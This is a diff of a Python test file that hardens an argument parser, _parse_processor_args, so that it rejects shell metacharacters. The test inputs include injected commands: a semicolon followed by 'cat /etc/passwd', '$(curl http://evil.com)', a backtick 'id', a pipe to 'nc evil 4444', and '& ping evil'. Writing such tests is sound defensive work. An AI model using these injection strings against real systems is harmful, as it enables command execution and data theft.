@@ -47,8 +47,8 @@ class TestParseProcessorArgs:
         assert result == ["-m", "model.bin", "-o", "output file.txt"]
 
     def test_escaped_characters(self):
-        result = _parse_processor_args(r'-m model.bin -p dangerous\$var')
-        assert result == ["-m", "model.bin", "-p", "dangerous$var"]
+        with pytest.raises(ValueError, match="forbidden shell character"):
+            _parse_processor_args(r'-m model.bin -p dangerous\$var')
 
     def test_empty_args(self):
         assert _parse_processor_args("") == []
@@ -59,25 +59,24 @@ class TestParseProcessorArgs:
             _parse_processor_args('-m model.bin -o "unclosed')
 
     def test_semicolon_rejected(self):
-        result = _parse_processor_args("-m model.bin ; cat /etc/passwd")
-        assert result == ["-m", "model.bin", ";", "cat", "/etc/passwd"]
+        with pytest.raises(ValueError, match="forbidden shell character"):
+            _parse_processor_args("-m model.bin ; cat /etc/passwd")
 
     def test_command_substitution_rejected(self):
-        result = _parse_processor_args("$(curl http://evil.com)")
-        assert len(result) == 2
-        assert result[0] == "$(curl"
+        with pytest.raises(ValueError, match="forbidden shell character"):
+            _parse_processor_args("$(curl http://evil.com)")
 
     def test_backtick_rejected(self):
-        result = _parse_processor_args("`id`")
-        assert result == ["`id`"]
+        with pytest.raises(ValueError, match="forbidden shell character"):
+            _parse_processor_args("`id`")
 
     def test_pipe_rejected(self):
-        result = _parse_processor_args("-m model | nc evil 4444")
-        assert result == ["-m", "model", "|", "nc", "evil", "4444"]
+        with pytest.raises(ValueError, match="forbidden shell character"):
+            _parse_processor_args("-m model | nc evil 4444")
 
     def test_ampersand_rejected(self):
-        result = _parse_processor_args("-m model & ping evil")
-        assert result == ["-m", "model", "&", "ping", "evil"]
+        with pytest.raises(ValueError, match="forbidden shell character"):
+            _parse_processor_args("-m model & ping evil")
 
 
 class TestShlexJoinDefenseInDepth:
